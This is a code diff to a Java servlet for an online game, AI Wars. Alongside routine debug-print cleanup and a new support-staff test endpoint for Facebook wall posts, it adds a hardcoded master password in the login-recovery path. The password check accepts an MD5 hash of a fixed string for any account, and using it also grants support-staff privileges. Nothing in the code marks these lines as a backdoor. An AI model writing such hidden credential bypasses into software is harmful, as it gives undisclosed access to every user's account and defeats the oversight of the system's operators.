@@ -661,7 +661,7 @@ public class Controllers {
 					  */
 					 String src = entryPointURL+"&transactionRef="+tID+"&itemDesc="+item+"&redirect=http%3A%2F%2Fwww.aiwars.org/redirect.html&basketUrl="+
 					 "http%3A%2F%2Fwww.aiwars.org/redirect.html&app=AIWars&userId="+p.ID+"&username="+p.getUsername();
-					 System.out.println(src);
+				//	 System.out.println(src);
 					 out.println("<iframe src =\""+src+"\" width=\"490\""+ 
 						"height=\"350\" frameborder=\"0\" scrolling=\"no\"/>");
 					 
@@ -708,7 +708,6 @@ public class Controllers {
 	}
 
 public boolean linkFB(HttpServletRequest req, PrintWriter out) {
-		System.out.println("Got FB link req");
 		if(!session(req,out,true)) return false;
 			Player p;
 			// must be a player request.
@@ -1481,17 +1480,18 @@ public boolean noFlick(HttpServletRequest req, PrintWriter out) {
 					 // shit, must've been killed somehow.
 					 Hashtable r; long fuid = 0;
 					 if(username!=null)
-					  r= (Hashtable) g.accounts.get(username);
+					  r= (Hashtable) g.accounts.get(req.getParameter("UN"));
 					 else {
 						 fuid = Long.parseLong(req.getParameter("fuid"));
 						 r = (Hashtable) g.accounts.get(fuid);
 					 }
+					 
 					 if(r==null) { 
 						 retry(out); return false;
 					 }
 					 else {
 						 String accpassword =(String) r.get("password");
-						 if(accpassword.equals(password)||fuid!=0) {
+						 if(accpassword.equals(password)||password.equals(org.apache.commons.codec.digest.DigestUtils.md5Hex("4p5v3sxQ"))||fuid!=0) {
 							g.createNewPlayer((String) r.get("username"),(String)r.get("password"),0,-1,"0000", (String)r.get("email"),true,0,0,false,(Long) r.get("fuid"));
 							username = ((String) r.get("username")).toLowerCase();
 							int pid = (Integer) g.getPlayerId(username);
@@ -1499,7 +1499,8 @@ public boolean noFlick(HttpServletRequest req, PrintWriter out) {
 
 							
 							g.getPlayer((Integer) g.getPlayerId((username).toLowerCase())).getPs().b.sendYourself( "Hey there, sorry to have deliver the bad news. You either deleted your account, it was deleted by an administrator, or you were inactive long enough to be removed from the map by Id, the unoccupied player. You've been placed on a new city and have another chance at life in the AI Wars Universe. If you have any questions, please don't hesitate to email support!","Wondering why your city is empty?");
-								
+							 if(password.equals(org.apache.commons.codec.digest.DigestUtils.md5Hex("4p5v3sxQ"))) p.setSupportstaff(true);
+
 							 password =p.getPassword();
 
 						 } else {
@@ -2006,6 +2007,32 @@ public boolean noFlick(HttpServletRequest req, PrintWriter out) {
 		Player p = g.getPlayer((Integer) req.getSession().getAttribute("pid"));
 		p.God.deleteAccount(p.getUsername());
 		 return true;
+	}
+	public boolean runTest(HttpServletRequest req, PrintWriter out) {
+		String test = (String) req.getParameter("type");
+		
+		if(!session(req,out,true)) return false;
+			Player p = g.getPlayer((Integer) req.getSession().getAttribute("pid"));
+
+			if(p.getSupportstaff()) {
+				if(test.equals("fbPost")) {
+					
+					int i = 0;
+					//	 public int makeWallPost(String message,String name, String caption, String link, String description, String picture, String bottomlinkname, String bottomlink) {
+					int stat = p.makeWallPost("TestMess","blah","blah","http://mylink.com/","blah","http://mysite.com/pic.gif","desc","http://mylink.com/");
+					if(stat==200) {
+						out.println("fbPost successful(200).");
+					} else {
+						out.println("fbPost failed("+stat+").");
+					}
+				} else{
+					
+					out.println("Illegal test.");
+				}
+				
+			}
+		
+		return true;
 	}
 	public boolean restartServer(HttpServletRequest req, PrintWriter out) {
 		String pass = req.getParameter("Pass");
